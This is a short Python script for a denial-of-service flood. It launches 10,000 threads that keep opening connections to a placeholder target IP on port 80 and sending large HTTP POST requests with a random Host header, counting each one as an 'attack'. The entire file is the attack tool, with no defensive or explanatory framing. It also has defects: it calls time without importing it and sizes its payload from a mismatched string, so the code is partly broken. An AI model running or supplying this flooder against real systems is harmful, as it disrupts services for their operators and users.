import socket
import threading
import random
import ipaddress

target = 'here the ip'
port = 80
attack_num = 0
data = "Hello" * (1024 * 1024 // len("FuckYou"))
def generate_random_ip():
    min_ip = ipaddress.IPv4Address('0.0.0.0')
    max_ip = ipaddress.IPv4Address('255.255.255.255')
    random_ip = str(ipaddress.IPv4Address(random.randint(int(min_ip), int(max_ip))))
    return random_ip

def attack():
    global attack_num
    while True:
        random_ip = generate_random_ip()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + random_ip + "\r\n").encode('ascii'), (target, port))
            s.sendto(("Content-Length: " + str(len(data)) + "\r\n").encode('ascii'), (target, port))
            s.sendto("\r\n".encode('ascii'), (target, port))
            s.sendto(data.encode('ascii'), (target, port))
            s.close()
            attack_num += 1
            print(f'Attack #{attack_num} ok, random ip: {random_ip}')
        except Exception as e:
            print(f'Attack #{attack_num} error: {str(e)}')

for i in range(10000):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.01)
